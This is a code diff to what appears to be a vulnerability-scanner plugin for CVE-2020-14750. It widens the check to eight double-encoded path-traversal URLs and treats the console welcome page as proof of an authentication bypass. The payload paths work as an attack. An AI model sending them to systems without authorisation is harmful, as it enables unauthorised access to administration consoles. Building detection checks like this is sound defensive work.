@@ -31,12 +31,22 @@ class CVE_2020_14750(Star):
 
     def light_up(self, dip, dport, force_ssl=None, *args, **kwargs) -> (bool, dict):
         session = requests.Session()
-        r, data = http(
-            'http://{}:{}/console/images/%252E./console.portal'.format(dip, dport), ssl=force_ssl, session=session)
-        r, data = http(
-            'http://{}:{}/console/images/%252E./console.portal'.format(dip, dport), ssl=force_ssl, session=session)
-        if r and 'id="welcome"' in r.text:
-            return True, {'url': r.url}
+        paths = [
+            '/images/%252E./console.portal',
+            '/images/%252e%252e%252fconsole.portal',
+            '/css/%252E./console.portal',
+            '/css/%252e%252e%252fconsole.portal',
+            '/console/images/%252E./console.portal',
+            '/console/images/%252e%252e%252fconsole.portal',
+            '/console/css/%252E./console.portal',
+            '/console/css/%252e%252e%252fconsole.portal', ]
+        for path in paths:
+            r, data = http(
+                'http://{}:{}{}'.format(dip, dport, path), ssl=force_ssl, session=session, timeout=5)
+            r, data = http(
+                'http://{}:{}{}'.format(dip, dport, path), ssl=force_ssl, session=session, timeout=5)
+            if r and 'id="welcome"' in r.text:
+                return True, {'url': r.url}
         return False, {}
 
 
